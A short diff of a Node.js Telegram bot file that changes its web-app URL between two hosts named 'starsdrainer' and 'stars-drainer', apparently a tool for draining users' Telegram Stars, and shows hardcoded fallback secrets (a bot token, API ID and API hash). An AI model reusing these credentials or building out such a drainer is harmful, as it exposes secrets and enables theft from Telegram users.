@@ -11,7 +11,7 @@ const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP
 const API_ID = parseInt(process.env.API_ID) || 30427944;
 const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
 const MY_USER_ID = 1398396668;
-const WEB_APP_URL = 'https://starsdrainer.onrender.com';
+const WEB_APP_URL = 'stars-drainer-OnLinep1.replit.app';
 
 const bot = new TelegramBot(BOT_TOKEN);
 const app = express();
